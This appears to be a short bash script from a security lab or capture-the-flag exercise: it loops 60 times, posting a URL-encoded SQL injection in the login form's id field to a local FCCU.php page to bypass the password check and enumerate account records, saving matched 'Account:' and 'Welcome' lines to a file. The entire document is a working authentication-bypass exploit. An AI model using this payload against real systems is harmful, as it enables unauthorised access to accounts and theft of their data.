#!/bin/bash
for CTR in {1..60}; do curl -X POST -d "id=%28+SELECT+id+FROM+accounts+LIMIT+1+OFFSET+$CTR%29%3B--&password=aaaa&submit=Submit" 'localhost/cgi-bin/FCCU.php' | grep -E "(Account:|Welcome)" >> stuff.txt; done
